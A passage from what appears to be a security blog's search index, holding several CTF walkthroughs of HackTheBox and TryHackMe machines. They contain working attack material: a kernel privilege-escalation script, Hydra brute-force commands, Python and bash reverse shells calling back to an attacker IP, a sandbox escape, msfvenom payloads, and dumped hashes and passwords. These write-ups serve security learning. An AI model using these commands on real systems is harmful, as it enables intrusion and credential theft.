JQ2SgsgTStzFZz47Yj/ZV61DMdr95eCo+bkfdijnBa5SsGRUdjafeU5hqZM1vTxRLU1G7Rr/yxmmA5mAHGeIXHTWRHYSWn9gonoSBFAAXvj0bZjTeNBAmU8eh6RI6pdapVLeQ0tEiwOu4vB/7mgxJrVfFWbN6w8AMrJBdrFzjENnvcq0qmmNugMAIict6hK48438fb+BX+E3y8YUN+LnbLsoxTRVFH/NFpuaw+iZvUPm0hDfdxD9JIL6FFpaodsmlksTPz366bcOcNONXSxuD0fJ5+WVvReTFdi+agF+sF2jkOhGTjc7pGAg2zl10O84PzXW1TkN2yD9YHgo9xYa8E2k6pYSpVxxYlRogfz9exupYVievBPkQnKo1Qoi15+eunzHKrxm3WQssFMcYCdYHlJtWCbgrKChsFys4oUE7iW0YQ0MsAdcg/hWuBX878aR+/3HsHaB1OTIcTxtaaMR8IMMaKSM=} I tried to decrypt with base64 encoding, but it is encrypted. I found this answer to decrypt the private key → https://stackoverflow.com/a/37683492\nGo to “Manage Jenkins” from Dashboard → “Script Console” on bottom — here we can able to run scripts — we also can get reverse shell using script console. Anyway, as of now, we will focus on decrypting our privatekey. Use this command to get the private ssh keys → println( hudson.util.Secret.decrypt(\u0026quot;ENCRYPTED_PASSPHRASE_OR_PASSWORD\u0026quot;) )\nSave this private key into the filename key, change the permission to 600 and login with ssh.\nWe got the flag.\n1 2 root@builder:~# cat root.txt e312ca26bd37fcbad7bd5f74ce90e78a ","description":"Detailed walkthrough of the Builder box on HackTheBox platform, covering initial enumeration with LFI, exploiting vulnerabilities, and obtaining user and root flags.","id":5,"section":"posts","tags":["HackTheBox","CVE","Jenkins"],"title":"HackTheBox Writeup - Builder Room","uri":"https://g4nd1v.github.io/posts/hackthebox-builder/"},{"content":" Title Analytics Description Analytics is HackTheBox Easy Linux Based Machine. Difficulty Easy Maker 7u9y and TheCyberGeek Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 └─$ nmap -sC -sV -oA nmap/analytics 10.10.11.233 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-25 20:13 EDT Nmap scan report for 10.10.11.233 Host is up (0.038s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75🇩🇪4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://analytical.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.93 seconds I didn’t find anything interesting in the webpage, therefore I ran gobuster if I can find anything, but again, no luck.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 └─$ gobuster dir -u analytical.htb -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://analytical.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /css (Status: 301) [Size: 178] [--\u0026gt; http://analytical.htb/css/] /images (Status: 301) [Size: 178] [--\u0026gt; http://analytical.htb/images/] /index.html (Status: 200) [Size: 17169] /js (Status: 301) [Size: 178] [--\u0026gt; http://analytical.htb/js/] Progress: 4614 / 4615 (99.98%) Next logical step will be to find subdomains. I have used ffuf to find it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 └─$ ffuf -u http://analytical.htb -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \u0026#39;Host: FUZZ.analytical.htb\u0026#39; -fs 154 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://analytical.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.analytical.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 154 ________________________________________________ data [Status: 200, Size: 77883, Words: 3574, Lines: 28, Duration: 86ms] We got subdomain data. Adding this domain to /etc/hosts .\n1 2 3 └─$ cat /etc/hosts ... 10.10.11.233 analytical.htb data.analytical.htb When I visited the page, I can see a login form from metabase, next thing I did was to find CVE in Metabase and luckily I got one!\nCVE - CVE-2023-38646\nYou will get session-token from /api/session/properties on data subdomain.\nAnd boom, we got reverse shell!\nUser Flag So after getting shell, I have checked user directory, there is no user.txt file. So I have started enumerating in different folders and lastly I found user and pass from env.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 f3ac61d15a77:/$ env env SHELL=/bin/sh MB_DB_PASS= HOSTNAME=f3ac61d15a77 LANGUAGE=en_US:en MB_JETTY_HOST=0.0.0.0 JAVA_HOME=/opt/java/openjdk MB_DB_FILE=//metabase.db/metabase.db PWD=/ LOGNAME=metabase MB_EMAIL_SMTP_USERNAME= HOME=/home/metabase LANG=en_US.UTF-8 META_USER=metalytics META_PASS=An4lytics_ds20223# MB_EMAIL_SMTP_PASSWORD= USER=metabase SHLVL=4 MB_DB_USER= FC_LANG=en-US LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib LC_CTYPE=en_US.UTF-8 MB_LDAP_BIND_DN= LC_ALL=en_US.UTF-8 MB_LDAP_PASSWORD= PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin MB_DB_CONNECTION_URI= JAVA_VERSION=jdk-11.0.19+7 _=/usr/bin/env Login with ssh → ssh metalytics@analytical.htb - password - An4lytics_ds20223#.\nUser Flag: 76ea979945743429071a9891a2f47620\nRoot Flag I have tried sudo -l but the user cannot use sudo. So I have ran linpeas. I found nothing interesting there.\nI have checked the kernel version and found there is a public exploit for it CVE-2023–2640.\n1 2 metalytics@analytics:/tmp$ uname -a Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629\n1 2 3 4 5 6 7 8 9 10 #!/bin/bash # CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation # by g1vi https://github.com/g1vi # October 2023 echo \u0026#34;[+] You should be root now\u0026#34; echo \u0026#34;[+] Type \u0026#39;exit\u0026#39; to finish and leave the house cleaned\u0026#34; unshare -rm sh -c \u0026#34;mkdir l u w m \u0026amp;\u0026amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m \u0026amp;\u0026amp; touch m/*;\u0026#34; \u0026amp;\u0026amp; u/python3 -c \u0026#39;import os;os.setuid(0);os.system(\u0026#34;cp /bin/bash /var/tmp/bash \u0026amp;\u0026amp; chmod 4755 /var/tmp/bash \u0026amp;\u0026amp; /var/tmp/bash -p \u0026amp;\u0026amp; rm -rf l m u w /var/tmp/bash\u0026#34;)\u0026#39; Run this script on the ssh machine, and we will get the root\nRoot Flag: f40e47ddd824d9c5354612f67c919b9d\n","description":"Analytics is HackTheBox Easy Linux Based Machine.","id":6,"section":"posts","tags":["HackTheBox","CVE"],"title":"HackTheBox Writeup - Analytics Room","uri":"https://g4nd1v.github.io/posts/hackthebox-analytics/"},{"content":" Title https://tryhackme.com/room/agentsudoctf Description You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. Difficulty Easy Maker https://tryhackme.com/p/DesKel Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 └─$ nmap -sC -sV -oA nmap/agentsudo 10.10.235.44 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-29 15:57 EST Nmap scan report for 10.10.235.44 Host is up (0.13s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA) | 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA) |_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Annoucement Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel There is no CVE we found from NMAP Scan.\nWebsite is giving some hint, it is saying use your codename as user-agent to access this site.\nAs the hint suggest, we have to use agent name in user-agent, so I opened burpsuite and edit user-agent as name of the agent.\nIt is saying - What are you doing! Are you one of the 25 employees? If not, I going to report this incident.\nNow, Instead of R, I tried different alphabets like A,B and so on. While testing for C we got the location, /agent_C_attention.php .\nSo the name of the agent is chris.\nNow, there is a ftp port open. So I tried to run ftp with default creds, but it didn’t work, so we have to bruteforce ftp using hydra.\n1 2 3 └─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.235.44 ftp ... [21][ftp] host: 10.10.235.44 login: chris password: crystal We found the password for chris\u0026rsquo;s ftp server, that is crystal. Let’s login into FTP and see what is inside it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 └─$ ftp chris@10.10.235.44 Connected to 10.10.235.44. 220 (vsFTPd 3.0.3) 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||21299|) 150 Here comes the directory listing. -rw-r--r-- 1 0 0 217 Oct 29 2019 To_agentJ.txt -rw-r--r-- 1 0 0 33143 Oct 29 2019 cute-alien.jpg -rw-r--r-- 1 0 0 34842 Oct 29 2019 cutie.png 226 Directory send OK. I have downloaded the files using get \u0026lt;filename\u0026gt; from FTP. Let’s see what is in To_agentJ.txt file.\n1 2 3 4 5 6 7 └─$ cat To_agentJ.txt Dear agent J, All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn\u0026#39;t be a problem for you. From, Agent C So, from this we got the hint that there is come kind of file inside this image. So I have used binwalk to get the data out of that image.\nbinwalk -e cutie.png → There is a zip file which contains password. So using john we can crack the password for the zip file.\n1 2 3 4 5 └─$ zip2john 8702.zip \u0026gt; hash.hash └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.hash ... alien (8702.zip/To_agentR.txt) So the password for the zip file us alien.\nThe zip file contain the following information.\n1 2 3 4 5 6 7 └─$ cat To_agentR.txt Agent C, We need to send the picture to \u0026#39;QXJlYTUx\u0026#39; as soon as possible! By, Agent R It seems like some kind of encoding, let’s try base64.\n1 2 └─$ echo QXJlYTUx | base64 -d Area51 user flag It seems Area51 is the password to decrypt data from cute-alien.jpg file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 └─$ steghide --extract -sf cute-alien.jpg Enter passphrase: wrote extracted data to \u0026#34;message.txt\u0026#34;. ┌──(kali㉿kali)-[~/Desktop/tryhackme/agentsudo] └─$ cat message.txt Hi james, Glad you find this message. Your login password is hackerrules! Don\u0026#39;t ask me why the password look cheesy, ask agent R who set this password for you. Your buddy, chris The other Agent’s name is james and the password of ssh for james is hackerrules!.\n1 2 3 4 james@agent-sudo:~$ ls Alien_autospy.jpg user_flag.txt james@agent-sudo:~$ cat user_flag.txt b03d975e8c92a7c04146cfa7a5a313c7 root flag Download the file Alient_autospy.jpg using scp and reverse search in google.\n└─$ sudo scp [james@10.10.235.44](mailto:james@10.10.235.44):Alien_autospy.jpg .\nAnswer is - Roswell alien autopsy\nRoot exploit article - https://www.exploit-db.com/exploits/47502\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 james@agent-sudo:~$ sudo -l Matching Defaults entries for james on agent-sudo: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User james may run the following commands on agent-sudo: (ALL, !root) /bin/bash james@agent-sudo:~$ sudo -u#-1 /bin/bash root@agent-sudo:~# cat /root/root.txt To Mr.hacker, Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. Your flag is b53a02f55b57d4439e3341834d70c062 By, DesKel a.k.a Agent R ","description":"You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.","id":7,"section":"posts","tags":["TryHackMe","Bruteforce","FTP","Hydra","CVE","Steganography"],"title":"TryHackMe Writeup - Agent Sudo Room","uri":"https://g4nd1v.github.io/posts/tryhackme-agentsudo/"},{"content":" Title https://tryhackme.com/room/blueprint Description Hack into this Windows machine and escalate your privileges to Administrator. Difficulty Easy Maker https://tryhackme.com/p/MrSeth6797 Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 └─$ nmap -sC -sV -oA nmap/blueprint 10.10.28.87 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-28 12:33 EST Nmap scan report for 10.10.28.87 Host is up (0.15s latency). Not shown: 987 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: 404 - File or directory not found. | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) |_http-title: Index of / |_ssl-date: TLS randomness does not represent time | http-ls: Volume / | SIZE TIME FILENAME | - 2019-04-11 22:52 oscommerce-2.3.4/ | - 2019-04-11 22:52 oscommerce-2.3.4/catalog/ | - 2019-04-11 22:52 oscommerce-2.3.4/docs/ |_ | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 445/tcp open microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql MariaDB (unauthorized) 8080/tcp open http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) |_http-title: Index of / |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 | http-ls: Volume / | SIZE TIME FILENAME | - 2019-04-11 22:52 oscommerce-2.3.4/ | - 2019-04-11 22:52 oscommerce-2.3.4/catalog/ | - 2019-04-11 22:52 oscommerce-2.3.4/docs/ |_ | http-methods: |_ Potentially risky methods: TRACE 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2s, deviation: 1s, median: 1s | smb-os-discovery: | OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1 | Computer name: BLUEPRINT | NetBIOS computer name: BLUEPRINT\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2024-02-28T17:35:00+00:00 |_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:b8:60:4f:ba:87 (unknown) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2024-02-28T17:35:00 |_ start_date: 2024-02-28T17:27:12 | smb2-security-mode: | 2:1:0: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . It is using osCommerce 2.3.4 - public exploit is available for this version - https://www.exploit-db.com/exploits/44374\nroot flag Instead of using the exploit directly, I used Metasploit framework.\nStart by searching the exploit.\nset options and then run the exploit, and boom, it will give you Metasploit shell.\nNow as we got the shell, navigate to the administrator desktop and cat the root file.\n1 2 3 4 meterpreter \u0026gt; pwd C:\\Users\\Administrator\\Desktop meterpreter \u0026gt; cat root.txt.txt THM{aea1e3ce6fe7f89e10cea833ae009bee} Hashdump Now we have php shell, which is useless to get the hashdump. It will give you error when running hashdump in that shell.\n1 2 meterpreter \u0026gt; hashdump [-] The \u0026#34;hashdump\u0026#34; command requires the \u0026#34;priv\u0026#34; extension to be loaded (run: `load priv`) So what we need to do is escalate php shell into window’s shell. To do so, I have found a blog which seems to bee very helpful - https://dl.packetstormsecurity.net/papers/attack/root3.pdf and https://sckull.github.io/posts/blueprint/\nAccording to the blog, firstly generate the payload using msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=1338 -f exe \u0026gt; payload.exe\nThen move to system folder (cd c:\\\\windows\\\\system32) and upload the payload into php shell using upload payload.exe.\nOpen a new msfconsole and then use the following command to start window's shell.\n1 2 3 4 5 use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost tun0 set lport 1338 exploit Now, execute the payload using execute -f payload.exe on php shell and boom, we got the window’s shell.\nThis are the hashes\n1 2 3 Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450::: Atlast, we can use crackstation website to crack the hash.\n","description":"Hack into this Windows machine and escalate your privileges to Administrator.","id":8,"section":"posts","tags":["TryHackMe","Meterpreter","CVE"],"title":"TryHackMe Writeup - Blueprint Room","uri":"https://g4nd1v.github.io/posts/tryhackme-blueprint/"},{"content":" Title https://tryhackme.com/room/bsidesgtlibrary Description boot2root machine for FIT and bsides guatemala CTF Difficulty Easy Maker https://tryhackme.com/p/stuxnet Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 └─$ nmap -sC -sV -oA nmap/library 10.10.157.19 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 11:55 EST Nmap scan report for 10.10.157.19 Host is up (0.10s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA) | 256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA) |_ 256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Welcome to Blog - Library Machine |_http-server-header: Apache/2.4.18 (Ubuntu) | http-robots.txt: 1 disallowed entry |_/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.15 seconds So, there are 2 ports that are open. ssh and http. It doesnot seem to contain CVE in apache version for remote code execution.\nNext, I tried to get directories using gobuster and tried to find subdomain using ffuf , but nothing showed interesting results.\nuser flag There are 2 things that is giving some hints. Firstly, in comments of the blog, it seems to have the usernames i.e. root , www-data , meliodas , and Anonymous. Moreover, in robots.txt there is a word rockyou. So maybe I thought bruteforce SSH using hydra?\nVoila, we got the password for SSH.\n1 2 3 4 └─$ hydra -L names.txt -P /usr/share/wordlists/rockyou.txt 10.10.157.19 ssh Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). ... [22][ssh] host: 10.10.157.19 login: meliodas password: iloveyou1 root flag Upon doing sudo -l we found there is a file which we can use as sudo.\n1 2 3 4 5 6 meliodas@ubuntu:~$ sudo -l Matching Defaults entries for meliodas on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User meliodas may run the following commands on ubuntu: (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py This is the content of the file\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 meliodas@ubuntu:~$ cat bak.py #!/usr/bin/env python import os import zipfile def zipdir(path, ziph): for root, dirs, files in os.walk(path): for file in files: ziph.write(os.path.join(root, file)) if __name__ == \u0026#39;__main__\u0026#39;: zipf = zipfile.ZipFile(\u0026#39;/var/backups/website.zip\u0026#39;, \u0026#39;w\u0026#39;, zipfile.ZIP_DEFLATED) zipdir(\u0026#39;/var/www/html\u0026#39;, zipf) zipf.close() Here is the file structure.\n1 2 3 4 5 6 7 8 9 10 11 12 13 meliodas@ubuntu:~$ ls -al total 40 drwxr-xr-x 4 meliodas meliodas 4096 Aug 24 2019 . drwxr-xr-x 3 root root 4096 Aug 23 2019 .. -rw-r--r-- 1 root root 353 Aug 23 2019 bak.py -rw------- 1 root root 44 Aug 23 2019 .bash_history -rw-r--r-- 1 meliodas meliodas 220 Aug 23 2019 .bash_logout -rw-r--r-- 1 meliodas meliodas 3771 Aug 23 2019 .bashrc drwx------ 2 meliodas meliodas 4096 Aug 23 2019 .cache drwxrwxr-x 2 meliodas meliodas 4096 Aug 23 2019 .nano -rw-r--r-- 1 meliodas meliodas 655 Aug 23 2019 .profile -rw-r--r-- 1 meliodas meliodas 0 Aug 23 2019 .sudo_as_admin_successful -rw-rw-r-- 1 meliodas meliodas 33 Aug 23 2019 user.txt Simple Solution is to remove the bak.py file and create new file and write shell there to and run it as sudo to get the root.\n1 2 3 4 5 6 meliodas@ubuntu:~$ mv bak.py bak.py.bk meliodas@ubuntu:~$ vi bak.py meliodas@ubuntu:~$ echo \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026gt; bak.py meliodas@ubuntu:~$ sudo python /home/meliodas/bak.py root@ubuntu:~# cat /root/root.txt e8c8c6c256c35515d1d344ee0488c617 root flag - Method #2 echo $PATH - it is using meliodas directory in the path, so we can create our rev shell in place of the library which is using in the program like zipfile.\nMore detailed explanation for Python-Library-Hijacking - https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/\n1 2 meliodas@ubuntu:~$ echo $PATH /home/meliodas/bin:/home/meliodas/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games On server\n1 2 3 4 5 6 7 meliodas@ubuntu:~$ vi zipfile.py meliodas@ubuntu:~$ cat zipfile.py import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.8.95.227\u0026#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]); meliodas@ubuntu:~$ ls bak.py user.txt zipfile.py zipfile.pyc meliodas@ubuntu:~$ sudo python3 /home/meliodas/bak.py \u0026lt;active shell connection\u0026gt; On Client\n1 2 3 4 5 6 7 8 9 10 11 12 13 └─$ nc -lvnp 4444 listening on [any] 4444 ... connect to [10.8.95.227] from (UNKNOWN) [10.10.157.19] 50962 # whoami root # ls bak.py __pycache__ user.txt zipfile.py zipfile.pyc # cat /root/root.txt e8c8c6c256c35515d1d344ee0488c617 ","description":"boot2root machine for FIT and bsides guatemala CTF","id":9,"section":"posts","tags":["TryHackMe","Hydra","Python-Library-Hijacking"],"title":"TryHackMe Writeup - Library Room","uri":"https://g4nd1v.github.io/posts/tryhackme-library/"},{"content":" Title https://tryhackme.com/room/bsidesgtdevelpy Description boot2root machine for FIT and bsides Guatemala CTF Difficulty Medium Maker https://tryhackme.com/p/stuxnet Nmap 1 2 3 4 5 6 7 8 └─$ nmap 10.10.224.39 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-23 18:52 EST Nmap scan report for 10.10.224.39 Host is up (0.096s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 10000/tcp open snet-sensor-mgmt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 └─$ nmap -n -sV --script \u0026#34;ndmp-fs-info\u0026#34; -p 10000 10.10.224.39 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-23 18:55 EST Stats: 0:01:45 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.00% done Stats: 0:01:51 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.00% done Nmap scan report for 10.10.224.39 Host is up (0.093s latency). PORT STATE SERVICE VERSION 10000/tcp open snet-sensor-mgmt? | fingerprint-strings: | GenericLines: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 0 | SyntaxError: unexpected EOF while parsing | GetRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; | NameError: name \u0026#39;GET\u0026#39; is not defined | HTTPOptions, RTSPRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; | NameError: name \u0026#39;OPTIONS\u0026#39; is not defined | NULL: | Private 0days |_ Please enther number of exploits to send??: So python service is running at port 10000 we can connect using nc.\n1 2 3 4 5 6 7 8 └─$ nc 10.10.224.39 10000 Private 0days Please enther number of exploits to send??: 1 Exploit started, attacking target (tryhackme.com)... Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.064 ms Maybe a pyjail? I don’t know, let’s try!\nuser flag Bypass Python sandboxes\nVoila, it worked!\n1 2 3 4 5 6 7 8 └─$ nc 10.10.224.39 10000 Private 0days Please enther number of exploits to send??: __builtins__.__import__(\u0026#34;os\u0026#34;).system(\u0026#34;ls\u0026#34;) credentials.png exploit.py root.sh run.sh user.txt Exploit started, attacking target (tryhackme.com)... 1 2 3 4 5 6 7 8 ─$ nc 10.10.224.39 10000 Private 0days Please enther number of exploits to send??: __builtins__.__import__(\u0026#34;os\u0026#34;).system(\u0026#34;cat user.txt\u0026#34;) cf85ff769cfaaa721758949bf870b019 Exploit started, attacking target (tryhackme.com)... Connecting with rev bash shell,\nroot flag use this to get the rev shell - **builtins**.**import**(\u0026quot;os\u0026quot;).system(\u0026quot;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.95.227/4444 0\u0026gt;\u0026amp;1'\u0026quot;)\nWe will get the shell as king user.\nThere is a file named as credentials.png , now we have to download using nc.\n1 2 3 4 5 On your machine nc -l -p 1234 -q 1 \u0026gt; credentials.png \u0026lt; /dev/null On King\u0026#39;s machine cat credentials.png | netcat 10.8.95.227 1234 well, it does not seem like png file. I cannot be able to crack it. (Yes yes, later I have checked writeup for it!) — it was piet programming (https://www.bertnase.de/npiet/). Anyway…\nHere, we can able to read file and delete it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 king@ubuntu:~$ ls -al ls -al total 324 drwxr-xr-x 4 king king 4096 Aug 27 2019 . drwxr-xr-x 3 root root 4096 Aug 25 2019 .. -rw------- 1 root root 2929 Aug 27 2019 .bash_history -rw-r--r-- 1 king king 220 Aug 25 2019 .bash_logout -rw-r--r-- 1 king king 3771 Aug 25 2019 .bashrc drwx------ 